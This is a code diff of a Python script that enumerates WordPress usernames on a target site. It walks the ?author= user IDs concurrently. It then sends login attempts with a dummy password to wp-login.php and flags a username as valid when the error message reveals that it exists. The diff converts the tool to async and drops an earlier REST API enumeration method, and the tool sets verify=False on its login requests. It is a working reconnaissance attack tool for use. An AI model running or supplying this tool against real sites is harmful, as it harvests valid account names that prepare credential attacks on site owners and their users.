@@ -1,82 +1,86 @@
 #!/usr/bin/python3
 
-import requests
-import argparse
-import json
+import argparse, logging, sys
 from bs4 import BeautifulSoup
+from requests_html import AsyncHTMLSession
+import asyncio
 
-def info(string):
-    if args.verbose:
-        print(string.replace("\n",""))
-
-def api_enum():
-    r = s.get(args.url+'/wp-json/wp/v2/users?per_page=100')
-    users_json = json.loads(r.text)
-    for i in users_json:
-        given_users.add(i['name'].lower())
-        given_users.add(i['slug'].lower())
-        info(f"Find Name: {i['name']}, Slug: {i['slug']}")
+FORMAT = '[%(asctime)s] [%(levelname)-8s] [%(message)s]'
+G_USERS = set()
+V_USERS = []
         
-def id_enum():
-    for id in range(2,101):
-        r = s.get(f'{args.url}/?author={id}')
+async def id_enum(id,s):
+    global G_USERS
+    try:
+        r = await s.get(f'{args.url}/?author={id}')
         if r.status_code == 200:
             soup = BeautifulSoup(r.content, "html.parser")
             name = soup.find("span").get_text()
             body = soup.find('body')
             slug = body.get('class')[2].replace('author-','')
-            given_users.add(name.lower())
-            given_users.add(slug.lower())   
-            info(f'Find Name: {name}, Slug: {slug}')
-
-def login_enum():
-    val_users = []
-    for username in given_users:
-        data = {
-            'log':username,
-            'pwd':'p@assword',
-            'wp-submit':'Login In'
-        }
-        headers = {
-            'Content-Type': 'application/x-www-form-urlencoded'
-        }
-        r = s.post(args.url+'/wp-login.php', headers=headers, data=data, verify=False)
+            G_USERS.add(name.lower())
+            G_USERS.add(slug.lower())   
+            logging.info(f'Find : (ID: {id} ; NAME: {name} ; SLUG: {slug})')
+    except Exception as e:
+        print(f'User ID Enumeration Failed : {e}')
+        exit(-1)
+async def login_enum(g_user,s):
+    global V_USERS
+    data = {
+        'log':g_user,
+        'pwd':'p@assword',
+        'wp-submit':'Login In'
+    }
+    headers = {
+        'Content-Type': 'application/x-www-form-urlencoded'
+    }
+    try:
+        r = await s.post(args.url+'/wp-login.php', headers=headers, data=data, verify=False)
         if 'The password you entered for the username' in r.text:
-            val_users.append(username)
+            V_USERS.append(g_user)
         else:
-            info(f"[-] Tryed: {username}")
-    return val_users
-
-def main():
-    print("Running\n")
-    if 'api' in methode_list:
-        api_enum()
-    if 'id' in methode_list:
-        id_enum()
-    print(f'Find {len(given_users)} possible usernames')
-    val_users = login_enum()
-    print("Valide Usernames: "+str(val_users))
-    if args.output:
-        with open(args.output, 'w') as f:
-            for user in val_users:
-                f.write("%s\n" % user)
-        f.close()
-
-if __name__ == '__main__':
-    parser = argparse.ArgumentParser(description = 'Username Enumartion via API, User-ID and Login Alert')
-    group_enum = parser.add_mutually_exclusive_group(required=True)
-    parser.add_argument('--url', required=True, type=str)
-    group_enum.add_argument('-u', '--userlist', nargs='*' , default=[])
-    group_enum.add_argument('-m', '--methode',default='', type=str ,help='Select one or both: {api,id}')
-    parser.add_argument('-v', '--verbose', action=argparse.BooleanOptionalAction, default=False)
-    parser.add_argument('-o', '--output', nargs='?', default=None, const='wp_username.lst')
-    methode_list = parser.parse_args().methode.split(",")
-    args = parser.parse_args()
-
-    s = requests.session()
-    given_users = set()
-    if args.userlist:
+            logging.info(f"Tryed: {g_user}")
+    except Exception as e:
+        print(f'Login Enumeration Failed : {e}')
+        exit(-1)
+    
+async def main():
+    global G_USERS
+    print('\n| Start User Enum Script')
+    s = AsyncHTMLSession()
+    if not args.skipIdEnum:
+        tasks = (id_enum(id,s) for id in range(1,args.id))
+        await asyncio.gather(*tasks)
+    
+    if not args.skipLoginEnum:  
         for listname in args.userlist:
             username_list = [line.lower().replace("\n","") for line in open(listname, 'r')]
-            given_users.update(username_list)
-    main()
+            G_USERS.update(username_list)
+        tasks = (login_enum(g_user,s) for g_user in G_USERS)
+        await asyncio.gather(*tasks)
+
+    if len(V_USERS):
+        print(f'| Valide Usernames: {str(V_USERS)}')
+        if args.output:
+            with open(args.output, 'w') as f:
+                for user in V_USERS:
+                    f.write("%s\n" % user)
+            f.close()
+    else:
+        print('| No Valide Usernames found')
+    print('| End')
+    exit()
+
+if __name__ == '__main__':
+    parser = argparse.ArgumentParser(description = 'Username Enumartion Skript, find Usernames via User ID and Login Alert')
+    parser.add_argument('--url', required=True, type=str, help='Target WordPress URL')
+    parser.add_argument('-u', '--userlist', nargs='*' , default=[], help='Liste with Usernames')
+    parser.add_argument('-o', '--output', nargs='?', default=None, const='wp_username.lst')
+    parser.add_argument('-i', '--id', type=int, default=100, help='Nummbers of User IDs to Brute Force')
+    parser.add_argument('-sIE', '--skipIdEnum', action=argparse.BooleanOptionalAction, default=False, help='Skip Enumeration via User ID')
+    parser.add_argument('-sLE', '--skipLoginEnum', action=argparse.BooleanOptionalAction, default=False, help='Skip Enumeration via Login Alert')
+    parser.add_argument('-log', '--level', default=20, type=int, help='Set Logging Level')
+    args = parser.parse_args()
+    args.url = args.url.rstrip('/')
+    logging.basicConfig(stream=sys.stdout, encoding='utf-8', format=FORMAT, level=args.level)
+    asyncio.run(main())
